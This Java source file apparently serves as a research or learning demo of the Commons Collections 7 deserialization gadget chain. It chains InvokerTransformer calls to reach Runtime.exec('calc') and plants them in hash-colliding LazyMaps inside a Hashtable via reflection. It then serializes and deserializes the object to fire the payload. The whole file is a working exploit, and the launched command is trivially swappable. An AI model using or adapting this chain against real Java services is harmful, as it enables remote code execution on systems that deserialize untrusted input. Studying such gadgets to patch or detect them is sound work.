import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7bugDemo {
    public static void main(String[] args) throws Exception {
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);
        InvokerTransformer it = new InvokerTransformer("getMethod",
            new Class[]{String.class,Class[].class},
            new Object[]{"getRuntime",new Class[0]}
        );
        InvokerTransformer it2 = new InvokerTransformer(
            "invoke",
            new Class[]{Object.class,Object[].class},
            new Object[]{null,new Object[0]}
        );
        InvokerTransformer it3 = new InvokerTransformer(
            "exec",
            new Class[]{String.class},
            new Object[]{"calc"}
        );
         ChainedTransformer ctChain = new ChainedTransformer(new Transformer[]{ct,it,it2,it3});
         

         HashMap map1 = new HashMap();
         HashMap map2 = new HashMap();
         map1.put("yy", 1);
         map2.put("zZ", 1);


            Map m1 = LazyMap.decorate(map1, new ConstantTransformer(1));
            Map m2 = LazyMap.decorate(map2, new ConstantTransformer(2));   //关键点这里factory不要设为ConstantTransformer(1)，会出现巧合

            Hashtable ht = new Hashtable();
            ht.put(m1, 1);
            ht.put(m2, 1);

            Field f = LazyMap.class.getDeclaredField("factory");
            f.setAccessible(true);
            f.set(m2, ctChain);
            f.set(m1, ctChain);


            m2.remove("yy");


            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(ht);
            oos.flush();
            byte[] bytes = baos.toByteArray();
            oos.close();
            System.out.println("Payload serialized successfully!");


            ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();
            System.out.println("Payload executed successfully!");


        
    }
}